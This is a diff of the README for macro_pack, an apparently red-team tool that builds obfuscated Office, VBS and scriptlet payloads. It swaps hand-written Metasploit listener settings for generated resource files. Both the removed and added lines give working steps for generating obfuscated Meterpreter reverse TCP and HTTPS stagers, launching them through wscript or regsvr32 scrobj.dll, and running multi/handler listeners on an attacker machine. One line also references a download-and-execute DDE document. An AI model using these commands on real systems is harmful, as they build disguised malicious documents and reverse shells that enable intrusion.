@@ -187,18 +187,10 @@ python macro_pack.py --dde -f ..\resources\community\ps_dl_exec.cmd -G DDE.doc
 
  - Generate obfuscated Meterpreter reverse TCP VBS file and run it  
  ```batch
-# 1 Generate obfuscated VBS based on meterpreter template
+# 1 Generate obfuscated VBS based on meterpreter template as well as Metasploit resource file
 echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.vbs
 # 2 On attacker machine Setup meterpreter listener
-Open msfconsole:
-use exploit/multi/handler
-set LHOST 0.0.0.0
-set PAYLOAD windows/meterpreter/reverse_tcp
-set AutoRunScript post/windows/manage/migrate
-set EXITFUNC thread
-set ExitOnSession false
-set EnableUnicodeEncoding true
-set EnableStageEncoding true
+msfconsole -r meterpreter.rc
 # 3 run VBS file with wscript (run 32bit wscript because meterpreter payload is 32bit)
 %windir%\SysWoW64\wscript meter.vbs
 
@@ -230,21 +222,10 @@ mshta.exe full/path/to/info.hta
 
  - Generate obfuscated Meterpreter reverse https TCP SCT file and run it  
  ```batch
-# 1 Generate obfuscated VBS scriptlet based on meterpreter reverse HTTPS template
+# 1 Generate obfuscated VBS scriptlet and Metasploit resource file based on meterpreter reverse HTTPS template
 echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.sct
 # 2 On attacker machinge Setup meterpreter listener
-Open msfconsole:
-use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_https
-
-set LHOST <attacker_ip> # NOTE this cannot be 0.0.0.0 for reverse https
-set LPORT <port>
-set AutoRunScript post/windows/manage/migrate
-set EXITFUNC thread
-set ExitOnSession false
-set EnableUnicodeEncoding true
-set EnableStageEncoding true
-exploit -j
+msfconsole -r webmeter.rc
 # 3 run scriptlet with regsvr32 
 regsvr32 /u /n /s /i:meter.sct scrobj.dll
 
@@ -432,38 +413,18 @@ This template is CSharp Meterpreter Stager build by Cn33liz and embedded within 
 Give this template the IP and PORT of listening mfsconsole  
   -> Example: ```echo <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm``` 
  
-Recommended msfconsole options (use exploit/multi/handler):
-```
-set PAYLOAD windows/meterpreter/reverse_tcp
-set LHOST <ip>
-set LPORT <port>
-set AutoRunScript post/windows/manage/migrate
-set EXITFUNC thread
-set ExitOnSession false
-set EnableUnicodeEncoding true
-set EnableStageEncoding true
-exploit -j
-```
+This template also generates a  meterpreter.rc file to create the Metasploit handler
+  -> Example: ```msfconsole -r meterpreter.rc``` 
+  
 
 ### WEBMETER  
 Meterpreter reverse TCP template using VbsMeter by Cn33liz.  
 This template is CSharp Meterpreter Stager build by Cn33liz and embedded within VBA using DotNetToJScript from James Forshaw.  
 Give this template the IP and PORT of listening mfsconsole  
   -> Example: ```echo <ip> <port> | macro_pack.exe -t WEBMETER -o -G meter.vsd``` 
- 
-Recommended msfconsole options (use exploit/multi/handler):
-```
-set PAYLOAD windows/meterpreter/reverse_https (32bit)
-set PAYLOAD windows/x64/meterpreter/reverse_https (64bit)
-set AutoRunScript post/windows/manage/migrate
-set LHOST <ip>
-set LPORT <port>
-set EXITFUNC thread
-set ExitOnSession false
-set EnableUnicodeEncoding true
-set EnableStageEncoding true
-exploit -j
-```
+
+This template also generates a  webmeter.rc file to create the Metasploit handler
+  -> Example: ```msfconsole -r webmeter.rc``` 
 
 
 ### EMBED_EXE    
